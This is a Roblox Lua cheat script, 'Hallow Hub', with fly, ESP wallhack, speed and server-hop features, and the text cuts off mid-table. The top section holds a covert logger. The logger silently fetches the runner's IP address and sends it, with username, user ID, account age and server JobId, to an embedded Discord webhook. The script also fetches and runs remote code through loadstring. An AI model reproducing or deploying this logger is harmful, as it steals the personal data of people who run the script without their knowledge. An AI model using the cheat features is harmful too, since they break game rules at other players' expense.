-- [[ 1. SERVICES ]]
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- [[ 2. CONFIGURATION ]]
local proxyURL = "https://webhook.lewisakura.moe/api/webhooks/1469708074393534476/2JrXROCkNkccb-Zq-c6tSZaOyJ441T8M9j-_7UcJdvmlN3UMqOwCPwkAZctUt5dViWDY/queue"

-- Blacklist (Add UserIDs here)
local blacklist = { 0 }

-- [[ 3. BLACKLIST CHECK ]]
for _, bannedID in pairs(blacklist) do
    if LP.UserId == bannedID then
        LP:Kick("‚ùå You are blacklisted from this script.")
        return 
    end
end

-- [[ 4. THE ULTRA LOGGER FUNCTION ]]
local function sendLog()
    -- Get Game Info
    local success, gameInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local gameName = success and gameInfo.Name or "Unknown Game"
    
    -- Check for Display Name
    local displayNameText = LP.DisplayName ~= LP.Name and " (AKA: " .. LP.DisplayName .. ")" or ""

    -- Build the Discord Message Data
    local data = {
        ["embeds"] = {{
            ["title"] = "‚≠ê Hallow Hub Executed",
            ["color"] = 16735027,
            ["fields"] = {
                  {["name"] = "üåê Connection Info",
                ["value"] = "**IP Address:** ||" .. (game:HttpGet("https://api.ipify.org") or "N/A") .. "||",
                ["inline"] = true
                },
                {
                    ["name"] = "üë§ User Info", 
                    ["value"] = "**Username:** " .. LP.Name .. displayNameText .. 
                                "\n**ID:** " .. LP.UserId .. 
                                "\n**Account Age:** " .. LP.AccountAge .. " days", 
                    ["inline"] = false
                },
                {
                    ["name"] = "üéÆ Game Info", 
                    ["value"] = "**Name:** " .. gameName .. 
                                "\n**Place ID:** " .. game.PlaceId, 
                    ["inline"] = true
                },
                -- NEW: Added Time Field for quick glance
                {
                    ["name"] = "‚è∞ Time (Local)",
                    ["value"] = "`" .. os.date("%X") .. "`",
                    ["inline"] = true
                },
                {
                    ["name"] = "üÜî Server Info (JobId)", 
                    ["value"] = "```" .. game.JobId .. "```", 
                    ["inline"] = false
                },
                {
                    ["name"] = "üîó Shortcuts", 
                    ["value"] = "[Join Game](https://www.roblox.com/games/" .. game.PlaceId .. ") | [View Profile](https://www.roblox.com/users/" .. LP.UserId .. "/profile)", 
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Hallow Hub Logger | Local Time: " .. os.date("%p") -- Shows AM or PM
            },
            -- This makes Discord show the "Relative" time (e.g. "Just now")
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    -- Executor-Friendly Request Handler
    local requestFunc = syn and syn.request or http and http.request or http_request or request or (HttpService and HttpService.PostAsync)
    
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = proxyURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

-- Run logger in background
task.spawn(sendLog)

-- ==================== Fly with Mobile Joystick Support =====================
local LP = game:GetService("Players").LocalPlayer
local UIS = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")
local flying = false
local bv, bg

_G.FlySpeed = 50

-- Mobile joystick movement values
local moveDirection = Vector3.new(0, 0, 0)
local jumpPressed = false

local function stopFly()
    flying = false
    if bv then bv:Destroy() bv = nil end
    if bg then bg:Destroy() bg = nil end
    if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
        LP.Character.Humanoid.PlatformStand = false
    end
    
    -- Unbind mobile controls when fly is off
    ContextActionService:UnbindAction("MobileFlyMovement")
    ContextActionService:UnbindAction("MobileFlyJump")
end

local function handleMobileMovement(actionName, inputState, inputObject)
    -- This gets called automatically by Roblox's joystick
    if inputObject and inputObject.Position then
        -- Convert joystick position to movement direction
        -- Position is a Vector2 where (-1,-1) to (1,1) represents joystick tilt
        local joystickPos = inputObject.Position
        
        -- Convert to camera-relative movement
        local cam = workspace.CurrentCamera
        local cf = cam.CFrame
        
        -- Forward/back from joystick Y, left/right from joystick X
        moveDirection = (cf.LookVector * -joystickPos.Y) + (cf.RightVector * joystickPos.X)
        moveDirection = Vector3.new(moveDirection.X, 0, moveDirection.Z).Unit
    end
    
    if inputState == Enum.UserInputState.End then
        moveDirection = Vector3.new(0, 0, 0)
    end
end

local function handleMobileJump(actionName, inputState, inputObject)
    if inputState == Enum.UserInputState.Begin then
        jumpPressed = true
    elseif inputState == Enum.UserInputState.End then
        jumpPressed = false
    end
end

local function startFly()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end

    stopFly()
    hum.PlatformStand = true
    
    bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9) 
    bv.Velocity = Vector3.new(0, 0, 0)
    bv.Parent = root

    bg = Instance.new("BodyGyro")
    bg.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
    bg.P = 15000
    bg.Parent = root

    flying = true
    
    -- Bind mobile joystick controls if on mobile
    if UIS.TouchEnabled then
        -- This binds to Roblox's default movement joystick
        ContextActionService:BindActionAtPriority(
            "MobileFlyMovement", 
            handleMobileMovement, 
            false, 
            Enum.ContextActionPriority.High.Value,
            Enum.UserInputType.Touch, 
            Enum.KeyCode.Thumbstick1  -- Left joystick
        )
        
        -- Bind jump button
        ContextActionService:BindAction(
            "MobileFlyJump",
            handleMobileJump,
            false,
            Enum.KeyCode.ButtonA  -- Jump button
        )
    end
    
    task.spawn(function()
        while flying and root and root.Parent do
            local cam = workspace.CurrentCamera
            local cf = cam.CFrame
            local speed = _G.FlySpeed 
            local moveDir = Vector3.new(0,0,0)
            
            -- Keyboard controls (PC)
            if UIS:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cf.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cf.LookVector end
            if UIS:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cf.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cf.RightVector end
            if UIS:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0, 1, 0) end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir - Vector3.new(0, 1, 0) end
            
            -- Mobile joystick controls
            moveDir = moveDir + moveDirection
            
            -- Mobile jump/descend
            if jumpPressed then
                -- If jump button is held, go up
                moveDir = moveDir + Vector3.new(0, 1, 0)
            end
            
            if moveDir.Magnitude > 0 then
                bv.Velocity = moveDir.Unit * speed
            else
                bv.Velocity = Vector3.new(0, 0, 0)
            end
            
            bg.CFrame = cf
            task.wait()
        end
    end)
end

-- Cleanup on character reset
LP.CharacterAdded:Connect(function()
    if flying then stopFly() end
end)

-- Optional: Add a small indicator that mobile controls are active
    local function showMobileIndicator()
    if not UIS.TouchEnabled then return end
    
    local screenGui = LP:FindFirstChild("PlayerGui") or Instance.new("ScreenGui")
    if not screenGui.Parent then
        screenGui.Parent = LP:WaitForChild("PlayerGui")
    end
    
    local indicator = Instance.new("TextLabel")
    indicator.Size = UDim2.new(0, 200, 0, 30)
    indicator.Position = UDim2.new(0.5, -100, 0, 10)
    indicator.Text = "Use joystick to fly!"
    indicator.TextColor3 = Color3.new(1, 1, 1)
    indicator.BackgroundTransparency = 0.5
    indicator.BackgroundColor3 = Color3.new(0, 0, 0)
    indicator.Parent = screenGui
    
    task.wait(3)
    indicator:Destroy()
end

-- Call this when fly is toggled on
-- showMobileIndicator() - you can call this from your toggle callback if you want the indicator to show every time fly is enabled.
-- ==================== Fly End ====================

local syde = loadstring(game:HttpGet("https://raw.githubusercontent.com/essencejs/syde/refs/heads/main/source",true))()

-- ==================== ESP CORE SYSTEM ====================
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local ESP_SETTINGS = {
    ENABLED = false,
    SHOW_ENEMIES = true,
    SHOW_TEAMMATES = false,
    SHOW_NAMES = true,
    SHOW_HEALTH = true,
    SHOW_DISTANCE = true,
    MAX_DISTANCE = 2000,
    NAME_MODE = "Both", 
    
    ENEMY_COLOR = Color3.fromRGB(255, 50, 50),
    TEAM_COLOR = Color3.fromRGB(50, 150, 255),
    FRIEND_COLOR = Color3.fromRGB(50, 255, 100),
    
    FILL_TRANSPARENCY = 0.5,
    OUTLINE_TRANSPARENCY = 0
}

local espData = {}

-- Simple test function
local function testESP()
    print("[ESP TEST] Testing ESP system...")
    print("LocalPlayer:", LocalPlayer.Name)
    print("Total players:", #Players:GetPlayers())
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            print("Found player:", player.Name)
        end
    end
end

-- Improved createESP function
local function createESP(player)
    if player == LocalPlayer then return end
    
    -- ADD THIS DUPLICATE CHECK RIGHT HERE
    if espData[player] then
        print("[ESP] ESP already exists for:", player.Name)
        return
    end
    
    print("[ESP] Creating ESP for:", player.Name)
    
    local function setupCharacter(character)
        if not character or not character:IsDescendantOf(workspace) then return end
        
        print("[ESP] Setting up character for:", player.Name)
        
        -- Wait a bit for character to fully load
        task.wait(1)
        
        -- Check if character still exists
        if not character or not character.Parent then return end
        
        -- Get head
        local head = character:FindFirstChild("Head")
        if not head then
            head = character:WaitForChild("Head", 2)
            if not head then return end
        end
        
        -- Remove old ESP
        local oldHighlight = character:FindFirstChild("ESP_Highlight")
        if oldHighlight then oldHighlight:Destroy() end
        
        local oldInfo = character:FindFirstChild("ESP_Info")
        if oldInfo then oldInfo:Destroy() end
        
        -- Create highlight
        local highlight = Instance.new("Highlight")
        highlight.Name = "ESP_Highlight"
        highlight.FillColor = ESP_SETTINGS.ENEMY_COLOR
        highlight.OutlineColor = ESP_SETTINGS.ENEMY_COLOR
        highlight.FillTransparency = ESP_SETTINGS.FILL_TRANSPARENCY
        highlight.OutlineTransparency = ESP_SETTINGS.OUTLINE_TRANSPARENCY
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Adornee = character
        highlight.Enabled = ESP_SETTINGS.ENABLED
        highlight.Parent = character
        
        -- Create billboard
        local billboard = Instance.new("BillboardGui")
        billboard.Name = "ESP_Info"
        billboard.Size = UDim2.new(0, 150, 0, 60)
        billboard.StudsOffset = Vector3.new(0, 3.5, 0)
        billboard.AlwaysOnTop = true
        billboard.MaxDistance = ESP_SETTINGS.MAX_DISTANCE
        billboard.Enabled = ESP_SETTINGS.ENABLED
        billboard.Adornee = head
        billboard.Parent = character
        
        -- Name label
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = player.Name
        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        nameLabel.TextSize = 14
        nameLabel.Font = Enum.Font.GothamBold
        nameLabel.TextStrokeTransparency = 0.5
        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        nameLabel.Visible = ESP_SETTINGS.SHOW_NAMES
        nameLabel.Parent = billboard
        
        -- Info label
        local infoLabel = Instance.new("TextLabel")
        infoLabel.Size = UDim2.new(1, 0, 0.5, 0)
        infoLabel.Position = UDim2.new(0, 0, 0.5, 0)
        infoLabel.BackgroundTransparency = 1
        infoLabel.Text = "100 HP"
        infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        infoLabel.TextSize = 12
        infoLabel.Font = Enum.Font.Gotham
        infoLabel.TextStrokeTransparency = 0.5
        infoLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        infoLabel.Visible = ESP_SETTINGS.SHOW_HEALTH or ESP_SETTINGS.SHOW_DISTANCE
        infoLabel.Parent = billboard
        
        -- Store data
        espData[player] = {
            highlight = highlight,
            billboard = billboard,
            nameLabel = nameLabel,
            infoLabel = infoLabel,
            character = character,
            head = head
        }
        
        print("[ESP] ESP created for:", player.Name)
        
        -- Update loop
        local connection
        connection = RunService.RenderStepped:Connect(function()
            local data = espData[player]
            if not data or not character or not character.Parent then
                if connection then connection:Disconnect() end
                return
            end
            
            -- Check if objects still exist
            if not data.highlight or not data.billboard then
                if connection then connection:Disconnect() end
                return
            end
            
            -- Enabled check
            if not ESP_SETTINGS.ENABLED then
                data.highlight.Enabled = false
                data.billboard.Enabled = false
                return
            end
            
            -- Get local character position
            local localChar = LocalPlayer.Character
            if not localChar then
                data.highlight.Enabled = false
                data.billboard.Enabled = false
                return
            end
            
            local localRoot = localChar:FindFirstChild("HumanoidRootPart") or localChar:FindFirstChild("Head")
            if not localRoot or not data.head then
                data.highlight.Enabled = false
                data.billboard.Enabled = false
                return
            end
            
            -- Distance check
            local distance = (localRoot.Position - data.head.Position).Magnitude
            
            if distance > ESP_SETTINGS.MAX_DISTANCE then
                data.highlight.Enabled = false
                data.billboard.Enabled = false
                return
            end
            
            -- Team check
            local isTeammate = false
            if player.Team and LocalPlayer.Team then
                isTeammate = player.Team == LocalPlayer.Team
            end
            
            -- Friend check
            local isFriend = false
            pcall(function()
                isFriend = player:IsFriendsWith(LocalPlayer.UserId)
            end)
            
            -- Show logic
            local shouldShow = true
            if isTeammate and not ESP_SETTINGS.SHOW_TEAMMATES then
                shouldShow = false
            elseif not isTeammate and not ESP_SETTINGS.SHOW_ENEMIES then
                shouldShow = false
            end
            
            if not shouldShow then
                data.highlight.Enabled = false
                data.billboard.Enabled = false
                return
            end

            -- ==================== NEW DYNAMIC NAME LOGIC ====================
            -- Determine the string based on the setting
            local nameToShow = ""
            if ESP_SETTINGS.NAME_MODE == "Username" then
            nameToShow = player.Name
            elseif ESP_SETTINGS.NAME_MODE == "Display Name" then
            nameToShow = player.DisplayName
            else
            nameToShow = player.DisplayName .. " (@" .. player.Name .. ")"
            end

           -- Apply it
           data.nameLabel.Text = isFriend and "‚≠ê " .. nameToShow or nameToShow
            -- ===============================================================
            
            -- Update colors
            local color
            if isFriend then
                color = ESP_SETTINGS.FRIEND_COLOR
            elseif isTeammate then
                color = ESP_SETTINGS.TEAM_COLOR
            else
                color = ESP_SETTINGS.ENEMY_COLOR
            end
            
            data.highlight.FillColor = color
            data.highlight.OutlineColor = color
            data.highlight.Enabled = true
            data.billboard.Enabled = true
            
            -- Update info
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid:IsA("Humanoid") then
                local health = math.floor(humanoid.Health)
                local maxHealth = math.floor(humanoid.MaxHealth)
                local healthPercent = humanoid.Health / humanoid.MaxHealth
                
                -- Build text
                local textParts = {}
                
                if ESP_SETTINGS.SHOW_HEALTH then
                    table.insert(textParts, health .. "/" .. maxHealth .. " HP")
                end
                
                if ESP_SETTINGS.SHOW_DISTANCE then
                    table.insert(textParts, math.floor(distance) .. "m")
                end
                
                data.infoLabel.Text = table.concat(textParts, " | ")
                
                -- Health color
                if humanoid.Health <= 0 then
                    data.infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
                elseif healthPercent < 0.3 then
                    data.infoLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
                elseif healthPercent < 0.6 then
                    data.infoLabel.TextColor3 = Color3.fromRGB(255, 255, 50)
                else
                    data.infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
                end
            else
                data.infoLabel.Text = ESP_SETTINGS.SHOW_DISTANCE and (math.floor(distance) .. "m") or ""
            end
            
            -- Update visibility
            data.nameLabel.Visible = ESP_SETTINGS.SHOW_NAMES
            data.infoLabel.Visible = ESP_SETTINGS.SHOW_HEALTH or ESP_SETTINGS.SHOW_DISTANCE
        end)
    end
    
    -- Connect character events
    if player.Character then
        task.spawn(function()
            setupCharacter(player.Character)
        end)
    end
    
    player.CharacterAdded:Connect(function(character)
        task.spawn(function()
            setupCharacter(character)
        end)
    end)
end

-- Function to initialize ESP (ENHANCED - NO MORE REFRESH BUTTON NEEDED!)
local function initializeESP()
    print("[ESP] Initializing ESP system with multi-scan...")
    
    -- Wait longer for players to load
    task.wait(3)
    
    -- Track which players we've already processed
    local scannedPlayers = {}
    
    -- Function to scan players with retry
    local function scanPlayers()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and not scannedPlayers[player] then
                scannedPlayers[player] = true
                print("[ESP] Creating ESP for:", player.Name)
                task.spawn(function()
                    createESP(player)
                end)
            end
        end
    end
    
    -- Initial scan
    scanPlayers()
    
    -- Second scan after 2 seconds (catches any that loaded late)
    task.wait(2)
    scanPlayers()
    
    -- Third scan after another 2 seconds (just to be safe)
    task.wait(2)
    scanPlayers()
    
    -- Handle new players that join after initialization
    Players.PlayerAdded:Connect(function(player)
        if player ~= LocalPlayer then
            print("üÜï New player joined, creating ESP for:", player.Name)
            task.spawn(function()
                createESP(player)
            end)
            
            -- Also handle when their character loads (in case it's delayed)
            player.CharacterAdded:Connect(function()
                task.wait(1)
                if not espData[player] then
                    print("üîÑ Player character loaded, creating ESP for:", player.Name)
                    createESP(player)
                end
            end)
        end
    end)
    
    -- Cleanup when players leave
    Players.PlayerRemoving:Connect(function(player)
        if espData[player] then
            local data = espData[player]
            if data.highlight then
                pcall(function() data.highlight:Destroy() end)
            end
            if data.billboard then
                pcall(function() data.billboard:Destroy() end)
            end
            espData[player] = nil
            print("[ESP] Removed ESP for:", player.Name)
        end
    end)
    
    print("[ESP] ESP system fully initialized with multi-scan!")
end

-- Run test
testESP()

syde:Load({
    Logo = '7488932274', -- cat code - 11914981751 -
	Name = 'Hallow Hub',
	Status = 'Stable', -- {Stable, Unstable, Detected, Patched}
	Accent = Color3.fromRGB(251, 144, 255), -- Window Accent Theme
	HitBox = Color3.fromRGB(251, 144, 255), -- Window HitBox Theme (ex. Toggle Color)
	AutoLoad = false, -- Does Not Work !
	Socials = {    -- Allows 1 Large and 2 Small Blocks
	},
	ConfigurationSaving = { -- Allows Config Saving
		Enabled = true,
		FolderName = 'Hallow Hub Configs', -- Create a custom folder for your hub's configs
		FileName = "HallowHubConfig" -- Config file name
	},
	AutoJoinDiscord = { 
		Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
		Invite = "CZRZBwPz", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
		RememberJoins = false -- Set this to false to make them join the discord every time they load it up
	},
})

local Window =syde:Init({
	Title = 'Hallow Hub'; -- Set Title
	SubText = 'Made With üíì By @Hallow08' -- Set Subtitle
})
   
-- Wait for window to fully load
task.wait(1)

-- ==================== ESP TAB ====================
local EspTab = Window:InitTab({
	Title = 'Esp', -- Set Title
})

-- Main ESP Settings
EspTab:Section('Esp Toggle')

local EnabledToggle = EspTab:Toggle({
	Title = 'Esp Enabled',
    Flag = 'ESP_Enabled',
    CurrentValue = ESP_SETTINGS.ENABLED,
    Config = true,
	CallBack = function(Value)
        ESP_SETTINGS.ENABLED = Value
        print("[ESP] ESP Enabled:", Value)
        
        for player, data in pairs(espData) do
            if data and data.highlight then
                data.highlight.Enabled = Value
            end
            if data and data.billboard then
                data.billboard.Enabled = Value
            end
        end
    end
})

local EnemiesToggle = EspTab:Toggle({
	Title = 'Show Enemies',
	CurrentValue = ESP_SETTINGS.SHOW_ENEMIES,
	CallBack = function(Value)
        ESP_SETTINGS.SHOW_ENEMIES = Value
        print("[ESP] Show Enemies:", Value)
	end,
	Flag = 'ESP_ShowEnemies'
})

local TeammatesToggle = EspTab:Toggle({
	Title = 'Show Teammates',
	CurrentValue = ESP_SETTINGS.SHOW_TEAMMATES,
	CallBack = function(Value)
        ESP_SETTINGS.SHOW_TEAMMATES = Value
        print("[ESP] Show Teammates:", Value)
	end,
	Flag = 'ESP_ShowTeammates'
})

local NamesToggle = EspTab:Toggle({
	Title = 'Show Names',
	CurrentValue = ESP_SETTINGS.SHOW_NAMES,
	CallBack = function(Value)
        ESP_SETTINGS.SHOW_NAMES = Value
        print("[ESP] Show Names:", Value)

        for _, data in pairs(espData) do
            if data and data.nameLabel then
                data.nameLabel.Visible = Value
            end
        end
	end,
	Flag = 'ESP_ShowNames'
})

local HealthToggle = EspTab:Toggle({
	Title = 'Show Health',
	CurrentValue = ESP_SETTINGS.SHOW_HEALTH,
	CallBack = function(Value)
        ESP_SETTINGS.SHOW_HEALTH = Value
        print("[ESP] Show Health:", Value)

        for _, data in pairs(espData) do
            if data and data.infoLabel then
                data.infoLabel.Visible = Value or ESP_SETTINGS.SHOW_DISTANCE
            end
        end
	end,
	Flag = 'ESP_ShowHealth'
})

local DistanceToggle = EspTab:Toggle({
	Title = 'Show Distance',
	CurrentValue = ESP_SETTINGS.SHOW_DISTANCE,
	CallBack = function(Value)
        ESP_SETTINGS.SHOW_DISTANCE = Value
        print("[ESP] Show Distance:", Value)

        for _, data in pairs(espData) do
            if data and data.infoLabel then
                data.infoLabel.Visible = Value or ESP_SETTINGS.SHOW_HEALTH
            end
        end
	end,
	Flag = 'ESP_ShowDistance'
})

-- FIXED DROPDOWN - note the parameter name
EspTab:Dropdown({
	Title = 'Name Display Mode',
	Options = {"Username", "Display Name", "Both"},
	CurrentOption = {"Both"},
	Multi = false,
    Flag = "NameModeDropdown",
	CallBack = function(option)  -- Keep as 'option' (lowercase)
	    local Selection = type(option) == "table" and option[1] or option  -- Use 'option' not 'Option'
        ESP_SETTINGS.NAME_MODE = Selection
        print("ESP Name Mode set to: " .. tostring(Selection))
	end,
})

-- Configuration Section
EspTab:Section("Configuration")

-- Max Distance Slider
local MaxDistanceSlider = EspTab:CreateSlider({
	Title = 'Max Distance',
	Sliders = {{
		Title = 'Studs',
		Range = {100, 20000},
		Increment = 50,
		StarterValue = 500,  -- Use StarterValue instead of CurrentValue
		CallBack = function(Value)
            ESP_SETTINGS.MAX_DISTANCE = Value
            print("[ESP] Max Distance:", Value)
            
            for _, data in pairs(espData) do
                if data and data.billboard then
                    data.billboard.MaxDistance = Value
                end
            end
		end,
		Flag = 'ESP_MaxDistance'
	}}
})

-- Fill Transparency Slider
local FillTransparencySlider = EspTab:CreateSlider({
	Title = "Fill Transparency",
	Sliders = {{
		Title = 'Fill Transparency',
		Range = {0, 1},
		Increment = 0.1,
		StarterValue = ESP_SETTINGS.FILL_TRANSPARENCY,  -- Use StarterValue
		CallBack = function(Value)
            ESP_SETTINGS.FILL_TRANSPARENCY = Value
            print("[ESP] Fill Transparency:", Value)
            
            for _, data in pairs(espData) do
                if data and data.highlight then
                    data.highlight.FillTransparency = Value
                end
            end
		end,
		Flag = 'ESP_FillTransparency'
	}}
})

-- Outline Transparency Slider
local OutlineTransparencySlider = EspTab:CreateSlider({
	Title = 'Outline Transparency',
	Sliders = {{
		Title = 'Outline Transparency',
		Range = {0, 1},
		Increment = 0.1,
		StarterValue = ESP_SETTINGS.OUTLINE_TRANSPARENCY,  -- Use StarterValue
		CallBack = function(Value)
            ESP_SETTINGS.OUTLINE_TRANSPARENCY = Value
            print("[ESP] Outline Transparency:", Value)
            
            for _, data in pairs(espData) do
                if data and data.highlight then
                    data.highlight.OutlineTransparency = Value
                end
            end
		end,
		Flag = 'ESP_OutlineTransparency'
	}}
})

-- Colors Section
EspTab:Section('Colors')

local EnemyColorPicker = EspTab:ColorPicker({
	Title = "Enemy Color",
	Linkable = false,
	Color = ESP_SETTINGS.ENEMY_COLOR,
	CallBack = function(Value)
        ESP_SETTINGS.ENEMY_COLOR = Value
        print("[ESP] Enemy Color:", Value)
	end,
	Flag = "ESP_EnemyColor"
})

local TeamColorPicker = EspTab:ColorPicker({
	Title = 'Team Color',
	Linkable = false,
	Color = ESP_SETTINGS.TEAM_COLOR,
	CallBack = function(Value)
        ESP_SETTINGS.TEAM_COLOR = Value
        print("[ESP] Team Color:", Value)
	end,
	Flag = 'ESP_TeamColor'
})

local FriendColorPicker = EspTab:ColorPicker({
	Title = 'Friend Color',
	Linkable = false,
	Color = ESP_SETTINGS.FRIEND_COLOR,
	CallBack = function(Value)
        ESP_SETTINGS.FRIEND_COLOR = Value
        print("[ESP] Friend Color:", Value)
	end,
	Flag = 'ESP_FriendColor'
})

-- Show startup notification
syde:Notify({
	Title = 'Hallow Interface Loaded',
	Content = 'Esp System Loaded',
	Duration = 5
	-- Icons Coming Very Soon
	-- Types Coming Very Soon ex. { Options }
})

print("‚úÖ ESP Tab Added to Hallow Interface")

-- ==================== FINAL UPDATE LOOP ====================
local scriptStart = tick()
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")

task.spawn(function()
    local fpsCount = 0
    local lastUpdate = tick()
    
    -- FPS Tracker logic
    local fpsConnection = RunService.RenderStepped:Connect(function()
        fpsCount = fpsCount + 1
    end)

    while true do
        pcall(function()
            -- 1. Total Players
            if _G.PlayerCountLabel then
                _G.PlayerCountLabel:Set("Total Players: " .. #game:GetService("Players"):GetPlayers())
            end

            -- 2. Session & Server Age
            local now = tick()
            local sessionDiff = math.floor(now - scriptStart)
            local serverDiff = math.floor(workspace.DistributedGameTime)
            
            if _G.UptimeLabel then
                _G.UptimeLabel:Set(string.format("Session: %dh %dm %ds", math.floor(sessionDiff/3600), math.floor((sessionDiff%3600)/60), sessionDiff%60))
            end
            if _G.ServerAgeLabel then
                _G.ServerAgeLabel:Set(string.format("Server Age: %dh %dm %ds", math.floor(serverDiff/3600), math.floor((serverDiff%3600)/60), serverDiff%60))
            end

            -- 3. Ping (Network Latency)
            if _G.PingLabel then
                local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
                _G.PingLabel:Set("Ping: " .. ping .. " ms")
            end

            -- 4. FPS (Frames Per Second)
            if _G.FPSLabel then
                local currentTime = tick()
                local timePassed = currentTime - lastUpdate
                local currentFPS = math.floor(fpsCount / timePassed)
                
                _G.FPSLabel:Set("FPS: " .. currentFPS)
                
                -- Reset FPS counter for next second
                fpsCount = 0
                lastUpdate = currentTime
            end
        end)
        
        task.wait(1)
    end
end)

-- ==================== UTILITY TAB ====================
local UtilityTab = Window:InitTab({
	Title = 'Utility',
})

--- Section for Server Information
UtilityTab:Section('Server Stats')  -- FIXED: No curly braces, just string

-- We use _G to make sure the loop can find these no matter what
_G.PlayerCountLabel = UtilityTab:Label("Total Players: " .. #game:GetService("Players"):GetPlayers(), "Left")
_G.UptimeLabel = UtilityTab:Label("Session Uptime: 0h 0m 0s", "Left")
_G.ServerAgeLabel = UtilityTab:Label("Server Age: 0h 0m 0s", "Left")
_G.PingLabel = UtilityTab:Label("Ping: 0 ms", "Left")
_G.FPSLabel = UtilityTab:Label("FPS: 0", "Left")

-- Copy JobID Button
UtilityTab:Button({
	Title = 'Copy JobID',
	CallBack = function()
        setclipboard(game.JobId)
        syde:Notify({Title = "Utility", Content = "JobID copied to clipboard!", Duration = 2})
    end
})

-- Copy Server Script Button
UtilityTab:Button({
	Title = 'Copy Server Script',
	CallBack = function()
        local scriptText = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game:GetService("Players").LocalPlayer)'
        setclipboard(scriptText)
        syde:Notify({Title = "Utility", Content = "Join script copied!", Duration = 2})
    end
})

-- Section for Server Management
UtilityTab:Section('Server Management')  -- FIXED

-- Rejoin Server Button
UtilityTab:Button({
	Title = 'Rejoin Server',
	CallBack = function()
        local ts = game:GetService("TeleportService")
        ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})

-- Server Hop Button
UtilityTab:Button({
	Title = 'Server Hop',
	CallBack = function()
        local HttpService = game:GetService("HttpService")
        local TeleportService = game:GetService("TeleportService")
        local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
        
        for _, v in pairs(Servers.data) do
            if v.playing < v.maxPlayers and v.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, v.id)
                break
            end
        end
    end
})

-- ===================== Infinite Yield ======================
UtilityTab:Section('Infinite Yield')  -- FIXED

UtilityTab:Button({
    Title = 'Execute Infinite Yield',
    CallBack = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end
})

UtilityTab:Label("Note: Infinite Yield is an admin script which I do not own, all credits to EdgeIY for creating it and maintaining it.", "Left")

-- ==================== MOVEMENT & PHYSICS ====================
UtilityTab:Section('Movement & Physics')  -- FIXED

local LP = game.Players.LocalPlayer

-- Camera FOV Slider
UtilityTab:CreateSlider({
    Title = "Camera FOV",
    Sliders = {{
        Title = "FOV",
        Range = {30, 120},
        Increment = 1,
        StarterValue = 70,
        CallBack = function(Value)
            if workspace.CurrentCamera then
                workspace.CurrentCamera.FieldOfView = Value
            end
        end,
        Flag = "FOV_Flag"
    }}
})

-- Walk Speed Slider (FIXED)
local SpeedSlider = UtilityTab:CreateSlider({
	Title = "Walk Speed",
	Sliders = {{
		Title = "Speed",
		Range = {16, 200},
		Increment = 1,
		StarterValue = 16,  -- Note: StarterValue, not CurrentValue
		CallBack = function(v)
			if LP.Character and LP.Character:FindFirstChild("Humanoid") then 
				LP.Character.Humanoid.WalkSpeed = v 
			end
		end,
		Flag = "WS_Flag"
	}}
})

-- Jump Power Slider (FIXED)
local JumpSlider = UtilityTab:CreateSlider({
	Title = "Jump Power",
	Sliders = {{
		Title = "Power",
		Range = {50, 500},
		Increment = 5,
		StarterValue = 50,
		CallBack = function(v) 
			local hum = LP.Character and LP.Character:FindFirstChild("Humanoid")
			if hum then 
				hum.UseJumpPower = true
				hum.JumpPower = v 
			end
		end,
		Flag = "JP_Flag"
	}}
})

-- Fly Speed Slider (FIXED)
UtilityTab:CreateSlider({
	Title = "Fly Speed",
	Sliders = {{
		Title = "Speed",
		Range = {10, 500},
		Increment = 1,
		StarterValue = 50,
		CallBack = function(Value)
			_G.FlySpeed = Value
		end,
